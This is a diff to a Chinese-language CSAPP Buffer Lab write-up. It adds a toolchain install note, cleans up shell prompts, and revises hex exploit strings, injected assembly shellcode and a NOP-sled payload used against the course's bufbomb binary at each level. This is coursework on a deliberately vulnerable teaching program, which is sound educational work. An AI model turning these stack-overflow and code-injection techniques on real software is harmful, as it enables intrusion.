@@ -8,6 +8,12 @@
 
 本次实验采用 `bovik` 用户,cookie值为 `0x1005b2b7`
 
+**需要 32 位工具链**
+
+```bash
+sudo apt-get install gcc-multilib
+```
+
 ## 实验报告
 
 本次实验五关是需要根据实验的文档来依次解决的,开始之前请仔细阅读文档
@@ -53,7 +59,7 @@ pop   %ebp
 ```
 
 ```bash
-root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout# ./hex2raw < 0.txt | ./bufbomb -u bovik
+$ ./hex2raw < 0.txt | ./bufbomb -u bovik
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:Smoke!: You called smoke()
@@ -94,7 +100,7 @@ b7 b2 05 10
 ```
 
 ```bash
-root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout# ./hex2raw < 1.txt | ./bufbomb -u bovik
+$ ./hex2raw < 1.txt | ./bufbomb -u bovik
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:Fizz!: You called fizz(0x1005b2b7)
@@ -119,14 +125,16 @@ Dump of assembler code for function bang:
    0x08048ca3 <+6>:     mov    0x804d100,%eax
 ```
 
-构造的汇编如下
+构造的汇编如下, a.s
 
 ```x86asm
 movl $0x1005b2b7,0x804d100
 ret
 ```
 
-`gcc -c -m32` `objdump`得到的字节码如下
+`gcc -c -m32 a.s` 编译得到 a.o, 这是一个 32 位的 elf 文件
+
+`objdump -d a.o` 反汇编得到的字节码如下
 
 ```txt
 level2.o:     file format elf32-i386
@@ -180,7 +188,7 @@ c3 00 00 00 00 00 00 00 00 00
 ```
 
 ```bash
-root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout# ./hex2raw < 2.txt | ./bufbomb -u bovik
+$ ./hex2raw < 2.txt | ./bufbomb -u bovik
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:Bang!: You set global_value to 0x1005b2b7
@@ -235,7 +243,7 @@ b8 b7 b2 05 10 bd e0 35 68 55
 ```
 
 ```bash
-root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout# ./hex2raw < 3.txt | ./bufbomb -u bovik
+$ ./hex2raw < 3.txt | ./bufbomb -u bovik
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:Boom!: getbuf returned 0x1005b2b7
@@ -381,8 +389,6 @@ Disassembly of section .text:
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90
-90 90 90 90 90 90 90 90 90 90
 
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
@@ -406,15 +412,15 @@ Disassembly of section .text:
 90 90 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90 90 90
 
-90 90 90 90 90 8d 6c 24 28 b8
 90 90 90 90 90 8d 6c 24 28 b8
 b7 b2 05 10 68 3a 8e 04 08 c3
-90 90 90 90
+
+00 00 00 00
 d8 33 68 55
 ```
 
 ```bash
-root@da1811a84ddc:~/csapp/04Buffer Lab (IA32)/buflab-handout# ./hex2raw < 4.txt -n | ./bufbomb -u bovik -n
+$ ./hex2raw < 4.txt -n | ./bufbomb -u bovik -n
 Userid: bovik
 Cookie: 0x1005b2b7
 Type string:KABOOM!: getbufn returned 0x1005b2b7
